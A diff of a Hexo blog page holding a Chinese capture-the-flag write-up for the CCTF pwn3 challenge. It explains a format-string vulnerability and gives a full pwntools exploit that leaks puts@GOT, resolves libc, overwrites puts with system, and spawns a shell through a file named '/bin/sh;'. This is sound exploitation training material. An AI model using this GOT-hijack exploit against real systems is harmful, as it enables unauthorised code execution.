@@ -1,206 +1,69 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="" class="loading">
 <head><meta name="generator" content="Hexo 3.8.0">
-    <meta charset="utf-8">
-    
-    
-    <title>CCTF_pwn3 | 知世の小屋 | 何不仗剑随风去,扶摇直上九万里</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    
-    <meta name="keywords" content="">
-    <link rel="shortcut icon" href="/img/favicon.jpg">
-    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
-    <link rel="stylesheet" href="/css/style.css?v=1.4.1">
-    
-    <script type="text/javascript">
-        // Data Center
-        var DC = {
-            reward:	true,
-            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
-            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
-            g: JSON.parse('{"enable":false,"lazy":true,"owner":"nightRainy","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
-            d: JSON.parse('{"app_id":null}')
-        };
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CCTF_pwn3 - 知世の小屋</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="my blogs,
+这道题主要使用了格式化字符串漏洞的hijack GOT技巧
+
+保护情况程序分析main函数:1234567891011121314151617181920212223242526272829303,"> 
+    <meta name="author" content="知世"> 
+    <link rel="alternative" href="atom.xml" title="知世の小屋" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/css/diaspora.css">
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
     </script>
-    <script type="text/javascript">
-        window.lazyScripts=[];
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
     </script>
-    
 </head>
-
-
-<body>
-    <div id="loading" class="active"></div>
-
-    <aside id="menu" class="hide">
-  <div class="inner flex-row-vertical">
-    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
-        <i class="icon icon-lg icon-close"></i>
-    </a>
-    <div class="brand-wrap">
-      
-      <img src="/img/brand.jpg" class="brand-bg">
-      
-      <div class="brand">
-        <a href="/" class="avatar waves-effect waves-circle waves-light">
-          <img src="/img/favicon.jpg">
-        </a>
-        <hgroup class="introduce">
-          <h5 class="nickname">知世</h5>
-          <a href="mailto:jianaiyuheng@qq.com" title="jianaiyuheng@qq.com" class="mail">
-            
-              <span>j</span>
-            
-              <span>i</span>
-            
-              <span>a</span>
-            
-              <span>n</span>
-            
-              <span>a</span>
-            
-              <span>i</span>
-            
-              <span>y</span>
-            
-              <span>u</span>
-            
-              <span>h</span>
-            
-              <span>e</span>
-            
-              <span>n</span>
-            
-              <span>g</span>
-            
-              <span>@</span>
-            
-              <span>q</span>
-            
-              <span>q</span>
-            
-              <span>.</span>
-            
-              <span>c</span>
-            
-              <span>o</span>
-            
-              <span>m</span>
-            
-          </a>
-        </hgroup>
-        
-        <ul class="menu-link">
-          
-              <li>
-                <a href="https://github.com/nightRainy" target="_blank">
-                  <i class="icon icon-lg icon-github"></i>
-                </a>
-              </li>
-            
-        </ul>
-        
-      </div>
-    </div>
-    <div class="scroll-wrap flex-col">
-      <ul class="nav">
-        
-            <li class="">
-              <a href="/">
-                <i class="icon icon-lg icon-home"></i>
-                HOME
-              </a>
-            </li>
-        
-            <li class="">
-              <a href="/archives">
-                <i class="icon icon-lg icon-archives"></i>
-                ARCHIVES
-              </a>
-            </li>
-        
-            <li class="">
-              <a href="https://github.com/nightRainy" target="_blank">
-                <i class="icon icon-lg icon-github"></i>
-                Github
-              </a>
-            </li>
-        
-      </ul>
-    </div>
-  </div>
-</aside>
-
-    <main id="main">
-        <header class="top-header" id="header">
-    <div class="flex-row clearfix">
-        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
-          <i class="icon icon-lg icon-navicon"></i>
-        </a>
-        <div class="flex-col header-title ellipsis">
-            <span>CCTF_pwn3</span>
-            
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">知世の小屋</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="https://nightRainy.github.io"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">CCTF_pwn3</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
         </div>
-        
-        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
-            <i class="icon icon-lg icon-search"></i>
-        </a>
-        
     </div>
-</header>
-<header class="content-header post-header">
-    <img src="/img/banner.jpg" class="header-bg">
-    <div class="container fade-scale">
-        <h1 class="title">CCTF_pwn3</h1>
-        <h5 class="subtitle">
-            
-                <time datetime="2019-04-17T15:53:24.000Z" itemprop="datePublished" class="page-time">
-  2019-04-17
-</time>
-
-
-            
-        </h5>
-        
-    </div>
-    
-
-</header>
-
-<div id="site_search">
-    <div class="search-title clearfix">
-        <span class="pull-left">
-          <i class="icon icon-lg icon-search"></i>
-        </span>
-        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left">
-        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
-          <i class="icon icon-lg icon-close"></i>
-        </a>
-    </div>
-    <div id="local-search-result"></div>
+    <div class="scrollbar"></div>
 </div>
 
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">CCTF_pwn3</h1>
+        <div class="stuff">
+            <span>四月 17, 2019</span>
+            
 
-<div class="container body-wrap">
-    <article id="post-CCTF-pwn3" class="post-article article-type-post" itemprop="blogPost">
-      <div class="post-card">
-          <h1 class="post-card-title">CCTF_pwn3</h1>
-          <div class="post-meta">
-              <time class="post-time" title="2019-04-17 23:53:24" datetime="2019-04-17T15:53:24.000Z" itemprop="datePublished">2019-04-17</time>
-
-              
-
-
-              
-
-              
-
-
-              
-          </div>
-          <div class="post-content" id="post-content" itemprop="postContent">
-              
-              <blockquote>
+        </div>
+        <div class="content markdown">
+            <blockquote>
 <p>这道题主要使用了格式化字符串漏洞的hijack GOT技巧</p>
 </blockquote>
 <h1 id="保护情况"><a href="#保护情况" class="headerlink" title="保护情况"></a>保护情况</h1><h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数:"></a>main函数:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  char s1; // [esp+14h] [ebp-2Ch]</span><br><span class="line">  int v5; // [esp+3Ch] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  setbuf(stdout, 0);</span><br><span class="line">  ask_username(&amp;s1);</span><br><span class="line">  ask_password(&amp;s1);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      print_prompt();</span><br><span class="line">      v3 = get_command();</span><br><span class="line">      v5 = v3;</span><br><span class="line">      if ( v3 != 2 )</span><br><span class="line">        break;</span><br><span class="line">      put_file();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v3 == 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      show_dir();</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v3 != 1 )</span><br><span class="line">        exit(1);</span><br><span class="line">      get_file();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -210,272 +73,90 @@
 <p>可以看到在get_file()函数中有格式化字符串漏洞,因此我们可以先绕过密码,然后确定格式化字符串参数偏移,然后获取 put 函数地址，就可以获取对应 system 函数地址。<br>然后可以修改got表,因此我们可以将put函数的GOT改向system,然后当程序再次执行 puts 函数的时候，就会执行 system 函数。</p>
 <p>exp如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">##context.log_level = &apos;debug&apos;</span><br><span class="line">pwn3 = ELF(&apos;./pwn3&apos;)</span><br><span class="line">if args[&apos;REMOTE&apos;]:</span><br><span class="line">    sh = remote(&apos;111&apos;, 111)</span><br><span class="line">else:</span><br><span class="line">    sh = process(&apos;./pwn3&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get(name):</span><br><span class="line">    sh.sendline(&apos;get&apos;)</span><br><span class="line">    sh.recvuntil(&apos;enter the file name you want to get:&apos;)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line">    data = sh.recv()</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def put(name, content):</span><br><span class="line">    sh.sendline(&apos;put&apos;)</span><br><span class="line">    sh.recvuntil(&apos;please enter the name of the file you want to upload:&apos;)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line">    sh.recvuntil(&apos;then, enter the content:&apos;)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show_dir():</span><br><span class="line">    sh.sendline(&apos;dir&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tmp = &apos;sysbdmin&apos;</span><br><span class="line">name = &quot;&quot;</span><br><span class="line">for i in tmp:</span><br><span class="line">    name += chr(ord(i) - 1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def password():</span><br><span class="line">    sh.recvuntil(&apos;Name (ftp.hacker.server:Rainism):&apos;)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">password()</span><br><span class="line"></span><br><span class="line">puts_got = pwn3.got[&apos;puts&apos;]</span><br><span class="line">log.success(&apos;puts got : &apos; + hex(puts_got))</span><br><span class="line">put(&apos;aaaa&apos;, &apos;%8$s&apos; + p32(puts_got))</span><br><span class="line">puts_addr = u32(get(&apos;aaaa&apos;)[:4])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;, puts_addr)</span><br><span class="line">system_offset = libc.dump(&apos;system&apos;)</span><br><span class="line">puts_offset = libc.dump(&apos;puts&apos;)</span><br><span class="line">system_addr = puts_addr - puts_offset + system_offset</span><br><span class="line">log.success(&apos;system addr : &apos; + hex(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(7, &#123;puts_got: system_addr&#125;)</span><br><span class="line">put(&apos;/bin/sh;&apos;, payload)</span><br><span class="line">sh.recvuntil(&apos;ftp&gt;&apos;)</span><br><span class="line">sh.sendline(&apos;get&apos;)</span><br><span class="line">sh.recvuntil(&apos;enter the file name you want to get:&apos;)</span><br><span class="line">##gdb.attach(sh)</span><br><span class="line">sh.sendline(&apos;/bin/sh;&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_dir()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
 
-          </div>
-          
-<blockquote class="post-copyright">
-    <div class="content">
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        <li title="0" data-url="http://link.hhtjim.com/163/5146554.mp3"></li>
+                    
+                        <li title="1" data-url="http://link.hhtjim.com/qq/001faIUs4M2zna.mp3"></li>
+                    
+                </ul>
+            
+        </div>
         
-<span class="post-time">
-    Last updated: <time datetime="2019-04-17T16:05:51.662Z" itemprop="dateUpdated">2019-04-18 00:05:51</time>
-</span><br>
+    <div id="gitalk-container" class="comment link" data-ae="false" data-ci="" data-cs="" data-r="" data-o="" data-a="" data-d="false">查看评论</div>
 
 
-        
-        转载注明出处，原文地址：<a href="/2019/04/17/CCTF-pwn3/" target="_blank" rel="external">https://nightRainy.github.io/2019/04/17/CCTF-pwn3/</a>
-        
     </div>
-    <footer>
-        <a href="https://nightRainy.github.io">
-            <img src="/img/favicon.jpg" alt="知世">
-            知世
-        </a>
-    </footer>
-</blockquote>
-
-          
-          
-          <div class="post-footer">
-              
-              <div class="page-share-wrap">
     
-
-<div class="page-share" id="pageShare">
-    <ul class="reset share-icons">
-      
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://nightRainy.github.io/2019/04/17/CCTF-pwn3/&title=《CCTF_pwn3》 — 知世の小屋&pic=https://nightRainy.github.io/img/favicon.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://nightRainy.github.io/2019/04/17/CCTF-pwn3/&title=《CCTF_pwn3》 — 知世の小屋&source=my blogs" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      
-    </ul>
- </div>
-
-
-
-    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
-        <i class="icon icon-share-alt icon-lg"></i>
-    </a>
-</div>
-
-          </div>
-          
-              
-
-
-          
-      </div>
-      
-<nav class="post-nav flex-row flex-justify-between">
-  
-    <div class="prev">
-      <a href="/2019/05/06/glic内存管理学习笔记/" id="post-prev" class="post-nav-link">
-        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">glic内存管理学习笔记</h4>
-      </a>
-    </div>
-  
-
-  
-    <div class="next">
-      <a href="/2019/04/16/mary-morton题解/" id="post-next" class="post-nav-link">
-        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
-        <h4 class="title">mary_morton题解</h4>
-      </a>
-    </div>
-  
-</nav>
-
-
-      
-      
-        <aside class="post-widget">
-            <nav class="post-toc-wrap" id="post-toc">
-                <strong>目录</strong>
-                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#保护情况"><span class="post-toc-number">1.</span> <span class="post-toc-text">保护情况</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#程序分析"><span class="post-toc-number">2.</span> <span class="post-toc-text">程序分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#main函数"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">main函数:</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ask-username"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">ask_username</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ask-passwd"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">ask_passwd</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#get-file"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">get_file</span></a></li></ol></li></ol>
-            </nav>
-            <div class="toc-bar"><div>
-        </div></div></aside>
-    
-  </article>
-  
-  
-</div>
-
-        <footer class="footer">
-    
-    <div class="bottom">
-        <p>
-            <span>
-                知世 &copy; 2017 - 2019
-            </span>
-        		
-           	
-            
-            
-            <span>
-	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
-            </span>
-            
-            
-            
-
-            
-                
-<span class="site-uv" title="总访客量">
-    <i class="icon icon-user"></i>
-    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
-</span>
-
-
-<span class="site-pv" title="总访问量">
-    <i class="icon icon-eye"></i>
-    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
-</span>
-
-            
-        </p>
-    </div>
-</footer>
-
-    </main>
-    <div class="mask" id="mask"></div>
-<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
-
-
-
-<div class="global-share" id="globalShare">
-    <ul class="reset share-icons">
-      
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://nightRainy.github.io/2019/04/17/CCTF-pwn3/&title=《CCTF_pwn3》 — 知世の小屋&pic=https://nightRainy.github.io/img/favicon.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://nightRainy.github.io/2019/04/17/CCTF-pwn3/&title=《CCTF_pwn3》 — 知世の小屋&source=my blogs" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      
-    </ul>
- </div>
-
-
-<div class="page-modal wx-share" id="wxShare">
-    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACN0lEQVR42u3awY6DMAxF0f7/TzOb2Yw6hPtsWgnnskKFkhwqubGd1wsfx9vxfvXs/vU95Pm3HTJkyHgs41geZ9PqjHJ2lfBOnyNDhowNGPzR5M71M9cBmowrQ4YMGSQI8uHJgpKcy5AhQ0aNQRLXdIkpQ4YMGZ0klpTS0mUfH+u2XFyGDBkPZPBi2ffPP9LfkCFDxqMYR3jwgJguFmvz+f2uDBkyRjN4gOPLwT64Nh8ZMmRMZaSPrjUy++3Pi09kyJAxmpGWtNJGZlqMS0M8+k1kyJAxgtEvwReHxFdJsJYhQ8Y+jDS81lqhHMYDtAwZMqYyau7adof+1IP/ChkyZIxmkITzE2ktXzj+cy5DhozRjM5CcD3di8Ea4RiV22TIkDGOUUtQ+UYuMgpqUqa/gwwZMkYweHORb4OoTSvdbIH+K2TIkDGOkR5p05E3DPhL/5OLy5AhYygjLZnVNmH0Xw26X4YMGUMZte0UtXJb/5PTEWXIkDGaUWsMpC3PNIhzZJCXy5Ah4+EMXlarNSzTJ6cFQRkyZOzDqBXIeFGMJ6jkBV0sCmXIkDGUQYId33JRW25y5GljQIYMGeMYtZSyhqy1M4P8W4YMGUMZabMwTTXTdDddGsYwGTJkPJbBS/Npee6ucLx+rTJkyNiH0Q98vNBGXkQxF5chQ4YM3E7gWy7IdFu7X2XIkLElo7+1Im12ohchQ4aMDRi8WJ+W0niKmzZEZciQsQ+jtlWLDM8Dbi1xlSFDxgaMH1kr8C6MCDmmAAAAAElFTkSuQmCC" alt="微信分享二维码">
 </div>
 
 
-    
-    <!-- main-js -->
-<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
-<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.1"></script>
-<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.1"></script>
-<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
-
-<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
-
-<script type="text/javascript" src="/js/method.js?v=1.4.1"></script>
-<script type="text/javascript" src="/js/blog.js?v=1.4.1"></script>
-
-<!-- third-party -->
-
-
-
-
-
-
-<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.1"></script>
-<script type="text/javascript">
-	var search_path = "search.xml";
-	if (search_path.length === 0) {
-		search_path = "search.xml";
-	}
-	var path = "/" + search_path;
-	searchFunc(path, "local-search-input", "local-search-result");
-</script>
-
-
-
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-
-    
-    
-
-
-
-
-
-    <!-- mathjax config similar to math.stackexchange -->
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-        tex2jax: {
-            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
-            processEscapes: true,
-            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-        }
-    });
-</script>
-
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for (i=0; i < all.length; i += 1) {
-            all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-    });
-</script>
-
-<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
-
-
-
-
-    <script>
-    (function() {
-        var OriginTitile = document.title, titleTime;
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                document.title = '/(ㄒoㄒ)/~~嘤嘤嘤，不要我了';
-                clearTimeout(titleTime);
-            } else {
-                document.title = '(つェ⊂)来啦官人';
-                titleTime = setTimeout(function() {
-                    document.title = OriginTitile;
-                },2000);
-            }
-        });
-    })();
-</script>
-
-
-
-
-
-    
+    </div>
+</div>
 </body>
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
 </html>
